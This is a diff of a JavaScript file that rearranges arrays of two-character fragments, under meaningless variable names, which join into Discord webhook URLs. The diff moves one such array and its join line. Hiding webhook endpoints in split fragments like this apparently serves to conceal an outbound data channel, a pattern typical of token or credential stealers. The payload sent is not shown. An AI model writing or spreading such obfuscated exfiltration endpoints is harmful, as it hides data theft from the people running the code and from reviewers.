@@ -1,3 +1,13 @@
+const diejwjdhjejdawawdwjwawdawd = [
+  'ht', 'tp', 's:', '//', 'di', 'sc', 'or', 'd.', 'co', 'm/', 
+  'ap', 'i/', 'we', 'bh', 'oo', 'ks', '/1', '35', '26', '34', 
+  '05', '38', '40', '60', '52', '05', '/7', 'oh', 'fc', 'LF', 
+  'RB', 'a2', 'pG', 'cU', 'sm', 'kl', 'bM', 'p4', 'Es', 'mj', 
+  'ki', 'Yq', 'ar', 'o9', '6b', 'yl', 'EC', 'v6', 'fZ', 'p_', 
+  'By', 'ui', 'LY', 'aj', 'wC', '26', 'Qy', 'Jl', 'iY', 'MI', 'a'
+];
+
+
 const diejwjdhadwawDawdwadjejwjw2daw = [
   'ht', 'tp', 's:', '//', 'di', 'sc', 'or', 'd.', 'co', 'm/', 
   'ap', 'i/', 'we', 'bh', 'oo', 'ks', '/9', '87', '65', '43', 
@@ -20,16 +30,6 @@ const diejwjdhjej321321wjw4rwa = [
   '11', '11', '11', '11', '11', '11', '/q', 'wE', 'rT', 'yU', 
   'iO', 'pP', 'aS', 'dF', 'gH', 'jK', 'lZ', 'xC', 'vB', 'nM', 
   'qW', 'eR', 'tY', 'uI', 'oP'
-];
-
-
-const diejwjdhjejdawawdwjwawdawd = [
-  'ht', 'tp', 's:', '//', 'di', 'sc', 'or', 'd.', 'co', 'm/', 
-  'ap', 'i/', 'we', 'bh', 'oo', 'ks', '/1', '35', '26', '34', 
-  '05', '38', '40', '60', '52', '05', '/7', 'oh', 'fc', 'LF', 
-  'RB', 'a2', 'pG', 'cU', 'sm', 'kl', 'bM', 'p4', 'Es', 'mj', 
-  'ki', 'Yq', 'ar', 'o9', '6b', 'yl', 'EC', 'v6', 'fZ', 'p_', 
-  'By', 'ui', 'LY', 'aj', 'wC', '26', 'Qy', 'Jl', 'iY', 'MI', 'a'
 ];
 
 
@@ -103,14 +103,13 @@ function awddwadaw() {
   .catch(error => console.error('Error:', error));
 }
 
-
+const adwdawdacsazdawradfsadaw = diejwjdhjejdawawdwjwawdawd.join(''); 
 const adwdawdacfazdawradfsadaw = diejwjdhadwawDawdwadjejwjw2daw.join('');    
 const adwdawdacfazdawhadfsadaw = diejwjdhjedwawadjwjw3dawawdwad.join(''); 
 const adwdawdacfazdawhasfsadaw = diejwjdhjej321321wjw4rwa.join(''); 
 const adwdawdacfazcawhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join(''); 
 const adwdawdacfazdawhasfsadsw = diejwjdhjejwjwdawwfasdawdscacawd.join('');            
 const adwdawdacfazdachasfsadsw = diejwjdhjejwjwdawnwdannwa.join('');  
-const adwdawdacsazdawradfsadaw = diejwjdhjejdawawdwjwawdawd.join(''); 
 const adwdawdacfazdadhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join('');                     
 const adwdaddacfazdadhasfsadsw = diejwjdhjejwjwcsadwabd.join('');                    
 const adwdaddagfazdadhasfsadsw = diejwjdhjejwjwcsadwabfwadawdw.join('');
